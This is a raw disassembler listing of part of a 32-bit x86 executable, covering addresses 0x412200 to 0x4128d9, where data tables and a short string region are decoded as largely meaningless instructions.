  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    ah,dl
  412425:	cmp    al,BYTE PTR [ebx]
  412427:	add    ah,dl
  412429:	sub    al,BYTE PTR [ebx]
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
  41274e:	add    DWORD PTR [eax],eax
  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
  41277d:	xor    al,BYTE PTR [ecx]
  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  412812:	add    DWORD PTR [eax],eax
  412814:	mov    dl,0x34
  412816:	add    DWORD PTR [eax],eax
  412818:	enter  0x134,0x0
  41281c:	fidiv  DWORD PTR [ecx+eax*1]
  41281f:	add    dh,ah
  412821:	xor    al,0x1
  412823:	add    dl,bh
  412825:	xor    al,0x1
  412827:	add    BYTE PTR [esi*1+0x350e0001],al
  41282e:	add    DWORD PTR [eax],eax
  412830:	push   ds
  412831:	xor    eax,0x35360001
  412836:	add    DWORD PTR [eax],eax
  412838:	dec    edx
  412839:	xor    eax,0x355a0001
  41283e:	add    DWORD PTR [eax],eax
  412840:	xor    ax,0x1
  412844:	je     0x41287b
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    dh,BYTE PTR ds:0x359c0001
  41284e:	add    DWORD PTR [eax],eax
  412850:	add    BYTE PTR [eax],al
  412852:	add    BYTE PTR [eax],al
  412854:	mov    edx,0xce000135
  412859:	xor    eax,0x35e00001
  41285e:	add    DWORD PTR [eax],eax
  412860:	in     al,dx
  412861:	xor    eax,0x36040001
  412866:	add    DWORD PTR [eax],eax
  412868:	adc    al,0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	sub    BYTE PTR [esi],dh
  41286e:	add    DWORD PTR [eax],eax
  412870:	ds add DWORD PTR ss:[eax],eax
  412874:	dec    esi
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	pusha  
  412879:	add    DWORD PTR ss:[eax],eax
  41287c:	ins    BYTE PTR es:[edi],dx
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	xor    BYTE PTR [esi],0x1
  412883:	add    BYTE PTR [esi-0x49fffeca],bl
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	retf   0x136
  41288f:	add    dl,bl
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	out    0x36,al
  412896:	add    DWORD PTR [eax],eax
  412898:	(bad)  
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	adc    BYTE PTR [edi],dh
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	and    dh,BYTE PTR [edi]
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	xor    dh,BYTE PTR [edi]
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	inc    esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	push   eax
  4128ad:	aaa    
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	pusha  
  4128b1:	aaa    
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	aaa    
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	js     0x4128f1
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    BYTE PTR [edi],dh
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	xchg   esi,eax
  4128c1:	aaa    
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	test   al,0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	mov    esi,0xd2000137
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jmp    0x138:0x137
  4128d7:	add    BYTE PTR [esi],cl
  4128d9:	cmp    BYTE PTR [ecx],al
